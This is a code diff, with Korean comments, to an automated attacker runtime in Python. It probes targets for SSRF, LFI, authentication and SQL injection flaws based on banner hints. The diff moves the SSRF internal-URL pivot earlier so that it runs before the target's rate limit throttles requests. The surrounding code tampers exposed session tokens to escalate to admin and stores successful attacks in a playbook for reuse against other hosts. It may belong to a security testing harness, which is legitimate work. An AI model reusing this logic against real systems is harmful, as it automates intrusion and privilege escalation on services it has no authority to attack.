@@ -280,13 +280,15 @@ class AttackerRuntime:
                                banner_headers, evidence_ref) -> bool:
         """배너 힌트로 4개 취약 부류(SSRF·LFI·AUTH·SQLI)를 토큰 0으로 시도한다.
 
-        SSRF는 1단 응답의 내부 URL을 2단으로 피벗하고, AUTH는 노출된 세션 토큰을 변조해
-        재전송한다. 성공 형태는 playbook에 기록해 같은 배너의 다른 표적에 재사용한다.
+        SSRF 2단 피벗은 base 시도 직후 **즉시** 실행한다. 승리 경로(예: /registry가 흘린
+        내부 URL 재프록시)를 sweep 끝까지 미루면, 그 사이 base 요청이 표적의 rate limit을
+        먼저 소진해 정작 피벗이 throttle될 수 있다. AUTH는 노출된 세션 토큰을 변조해 재전송한다.
+        성공 형태는 playbook에 기록해 같은 배너의 다른 표적에 재사용한다.
         """
         hints = suggest_vuln_classes(banner)
         attempts = build_attempts(banner, hints, endpoint.port)
-        ssrf_bodies = []           # (base_path, param, body) — 2단 피벗용
         cookie_name, cookie_val = self._cookie_from_headers(banner_headers)
+        pivoted = set()            # 이미 피벗한 내부 URL(중복 방지)
 
         def run(attempt) -> bool:
             nonlocal evidence_ref, cookie_name, cookie_val
@@ -301,26 +303,26 @@ class AttackerRuntime:
             if result is None:
                 return False
             evidence_ref = result.observation.evidence_ref
-            if attempt.vuln == VulnClass.SSRF and "?" in attempt.path:
-                base, _, query = attempt.path.partition("?")
-                param = query.split("=", 1)[0]
-                ssrf_bodies.append((base, param, result.body))
             if cookie_name is None:
                 cn, cv = self._cookie_from_headers(result.observation.redacted_header_hints)
                 if cn:
                     cookie_name, cookie_val = cn, cv
+            # SSRF base 응답이면 즉시 2단 피벗(승리 경로를 앞당겨 표적 rate limit 전에 회수).
+            # 피벗 응답 자체는 다시 피벗하지 않는다(reason 구분).
+            if (attempt.vuln == VulnClass.SSRF and attempt.reason != "ssrf:pivot"
+                    and "?" in attempt.path):
+                base, _, query = attempt.path.partition("?")
+                param = query.split("=", 1)[0]
+                fresh = [u for u in extract_internal_urls(result.body) if u not in pivoted]
+                pivoted.update(fresh)
+                for pivot in ssrf_pivot_attempts(base, param, fresh):
+                    if run(pivot):
+                        return True
             return False
 
         for attempt in attempts:
             if run(attempt):
                 return True
-
-        # SSRF 2단 피벗 — 1단이 흘린 내부 URL(평문·base64)을 다시 프록시한다
-        for base, param, body in ssrf_bodies:
-            urls = extract_internal_urls(body)
-            for pivot in ssrf_pivot_attempts(base, param, urls):
-                if run(pivot):
-                    return True
 
         # AUTH 세션 변조 — 노출된 토큰을 관리자 권한으로 올려 재전송한다
         if cookie_name and cookie_val:
